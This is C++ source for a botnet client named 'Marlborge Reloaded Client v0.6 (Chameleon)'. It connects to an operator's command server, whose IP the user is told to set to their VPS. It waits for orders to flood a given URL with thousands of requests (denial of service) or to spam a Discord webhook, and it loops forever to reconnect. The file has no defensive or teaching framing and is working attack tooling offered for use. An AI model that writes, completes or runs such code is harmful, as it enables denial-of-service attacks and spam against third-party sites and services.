#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <cpr/cpr.h>
#include <sstream>
#include <Windows.h>

#include "DiscordThings.h"
#include "HTTP.h"

using namespace std;

#pragma comment(lib, "Ws2_32.lib")

#define HOST "127.0.0.1" // Set your VPS IP Addres
#define PORT 3000 // Set the connection port
#define REQQUANTITY 3000

WSADATA wsaData;

SOCKET sock;
sockaddr_in saIn;
int iResult;
stringstream ss;

DiscordThings* dcThings;
HTTP* http;

char buffer[1024];

void ClearBuffer() {
	memset(buffer, 0, sizeof(buffer));
}

void ClearStream() {
	ss.str("");
	ss.clear();
}

void CloseSocket() {
	closesocket(sock);
	sock = NULL;
	WSACleanup();
	iResult = NULL;
	return;
}

void DoS() {
	recv(sock, buffer, sizeof(buffer), 0);
	cout << "Sending requests to the specified URL" << endl;
	ss << buffer; string url; ss >> url;
	http->DoS(url, REQQUANTITY);
}

void SpamDiscordWebhook() {
	cout << "Receiving Webhook" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; string webhook; ss >> webhook;
	ClearStream();
	ClearBuffer();
	cout << "Receiving Message" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; string msg; ss >> msg;
	cout << msg << endl;
	ClearStream();
	ClearBuffer();
	cout << "Receiving Quantity" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; int quantity; ss >> quantity;
	ClearStream();
	ClearBuffer();

	dcThings->SpamDiscordWebhook(webhook, msg, quantity);
	Sleep(30000);
	return;
}

void ConnectSocket() {
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (iResult != 0) {
		cout << "Failed at startup" << endl;
		exit(0);
	}

	if (iResult == INVALID_SOCKET) {
		cout << "Invalid socket" << endl;
		exit(0);
	}

	saIn.sin_family = AF_INET;
	inet_pton(AF_INET, HOST, &saIn.sin_addr.s_addr);
	saIn.sin_port = htons(PORT);
	iResult = connect(sock, (SOCKADDR*)&saIn, sizeof(saIn));

	if (iResult == SOCKET_ERROR) {
		cout << "Connection error" << endl;
		CloseSocket();
		ConnectSocket();
		return;
	}

	cout << "Connected" << endl;
}

void Listen() {
	cout << "Listening to the host" << endl;
	recv(sock, buffer, sizeof(buffer), 0);
	ss << buffer; int opt; ss >> opt;
	ClearBuffer();

	switch (opt) {
	case 1:
		DoS();
		break;
	case 2:
		SpamDiscordWebhook();
		break;
	default:
		cout << "Invalid option sent from host" << endl;
		break;
	}

	return;
}

int main() {
	cout << "Marlborge Reloaded Client v0.6 (Chameleon)" << endl;
	ConnectSocket();
	Listen();
	CloseSocket();
	main();

	return 0;
}